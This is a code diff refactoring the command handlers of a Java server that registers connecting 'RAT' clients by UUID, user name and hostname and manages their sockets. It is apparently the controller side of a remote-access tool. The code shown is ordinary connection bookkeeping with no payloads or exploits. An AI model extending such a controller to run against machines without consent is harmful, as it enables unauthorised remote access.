@@ -1,10 +1,10 @@
 package ovh.wpkg.lskg.server.command.commands;
 
-import io.netty.channel.Channel;
 import jakarta.inject.Inject;
 import jakarta.inject.Singleton;
 import lombok.extern.slf4j.Slf4j;
 import ovh.wpkg.lskg.server.command.Command;
+import ovh.wpkg.lskg.server.command.CommandContext;
 import ovh.wpkg.lskg.server.dto.RatClient;
 import ovh.wpkg.lskg.server.dto.WtpClient;
 import ovh.wpkg.lskg.server.services.RatClientPoller;
@@ -14,13 +14,11 @@ import ovh.wpkg.lskg.server.types.out.ActionOutPayload;
 import ovh.wpkg.lskg.services.rat.RatInfoService;
 import ovh.wpkg.lskg.services.users.UserService;
 
-import java.util.Arrays;
-import java.util.List;
-import java.util.Map;
 import java.util.UUID;
 
 @Singleton
 @Slf4j
+@SuppressWarnings("unused")
 public class DefaultCommands {
 
     @Inject
@@ -39,93 +37,60 @@ public class DefaultCommands {
     private RatInfoService ratInfoService;
 
     @Command(name = "hello")
-    public ActionOutPayload hello(Channel channel) {
-        String message = "Hello World!";
-        return new ActionOutPayload("hello", 0, message, message.length());
+    public ActionOutPayload hello(CommandContext context) {
+        return context.response(0, "Hello World!");
     }
 
-    @Command(name = "echo")
-    public ActionOutPayload echo(Map<String, String> params, Channel channel) {
-        StringBuilder result = new StringBuilder("Echo: ");
-        for (Map.Entry<String, String> entry : params.entrySet()) {
-            result.append(entry.getKey())
-                    .append("=")
-                    .append(entry.getValue())
-                    .append(" ");
-        }
-        String message = result.toString().trim();
-        return new ActionOutPayload("echo", 0, message, message.length());
+    @Command(name = "disconnect")
+    public ActionOutPayload disconnect(CommandContext context) {
+        context.getWtpClient().getChannel().disconnect();
+        return context.response(0, "Disconnected!");
     }
 
     @Command(name = "core-init")
-    public ActionOutPayload coreInit(Map<String, String> params, Channel channel) {
-        List<String> requiredKeys = Arrays.asList("uuid", "user", "hostname");
-
-        for (String key : requiredKeys) {
-            if (!params.containsKey(key) || params.get(key) == null || params.get(key).isEmpty()) {
-                String message = "Missing or empty parameter: " + key;
-                return new ActionOutPayload("core-init", 1, message, message.length());
-            }
-        }
-
+    public ActionOutPayload coreInit(CommandContext context) {
         try {
-            UUID uuid = UUID.fromString(params.get("uuid"));
-            String user = params.get("user");
-            String hostname = params.get("hostname");
+            if (context.checkParams("uuid", "user", "hostname"))
+                return context.response(1, "Missing or empty parameter");
+
+            UUID uuid = UUID.fromString(context.param("uuid"));
+            String user = context.param("user");
+            String hostname = context.param("hostname");
 
             ratInfoService.registerRat(userService.findUserById(1L), uuid, hostname, user);
-//            ratInfoService.shareRat(uuid, userService.findUserById(2L));
 
-            var wtpClient = wtpClientService.getClient(channel);
+            var wtpClient = wtpClientService.getClient(context.getWtpClient().getChannel());
 
             connectedRatService.addClient(wtpClient, uuid, user, hostname);
 
-            String message = "Registered client " + user + " " + hostname + " has been added!";
-            return new ActionOutPayload("core-init", 0, message, message.length());
-        } catch (IllegalArgumentException e) {
-            String message = "Invalid UUID format: " + params.get("uuid");
-            return new ActionOutPayload("core-init", 2, message, message.length());
+            return context.response(0,"Registered client " + user + " " + hostname + " has been added!");
         } catch (Exception e) {
-            e.printStackTrace();
-            String message = "An unexpected error occurred: " + e.getMessage();
-            return new ActionOutPayload("core-init", 3, message, message.length());
+            return context.response(3, "An unexpected error occurred: " + e.getMessage());
         }
     }
 
     @Command(name = "new-socket")
-    public ActionOutPayload newSocket(Map<String, String> params, Channel channel) {
-        List<String> requiredKeys = List.of("uuid");
-
-        for (String key : requiredKeys) {
-            if (!params.containsKey(key) || params.get(key) == null || params.get(key).isEmpty()) {
-                String message = "Missing or empty parameter: " + key;
-                return new ActionOutPayload("new-socket", 1, message, message.length());
-            }
+    public ActionOutPayload newSocket(CommandContext context) {
+        if (context.checkParams("uuid")) {
+            return context.response(1, "Missing or empty parameter");
         }
 
-        UUID uuid;
         try {
-            uuid = UUID.fromString(params.get("uuid"));
+            UUID uuid = UUID.fromString(context.param("uuid"));
+            RatClient rat = connectedRatService.getByUUID(uuid);
+
+            if (rat == null)
+                return context.response(1, "No entity found for UUID: " + uuid);
+
+            WtpClient wtpClient = new WtpClient(context.getWtpClient().getChannel());
+            rat.getSockets().add(wtpClient);
+
+            // Emit new WTP client id to ratClientPoller
+            ratClientPoller.getClientSink().tryEmitNext(context.getWtpClient().getChannel().id().asShortText());
+
+            return context.response(0, "Socket successfully added!");
         } catch (IllegalArgumentException e) {
-            String message = "Invalid UUID format: " + params.get("uuid");
-            return new ActionOutPayload("new-socket", 1, message, message.length());
+            return context.response(1, "Invalid UUID format: " + context.param("uuid"));
         }
-
-        RatClient rat = connectedRatService.getByUUID(uuid);
-        if (rat == null) {
-            String message = "No entity found for UUID: " + uuid;
-            return new ActionOutPayload("new-socket", 1, message, message.length());
-        }
-
-        WtpClient wtpClient = new WtpClient(channel);
-
-        rat.getSockets().add(wtpClient);
-
-        // Emit new WTP client id to ratClientPoller
-        ratClientPoller.getClientSink().tryEmitNext(channel.id().asShortText());
-
-        String message = "Socket successfully added!";
-        return new ActionOutPayload("new-socket", 0, message, message.length());
     }
-
 }
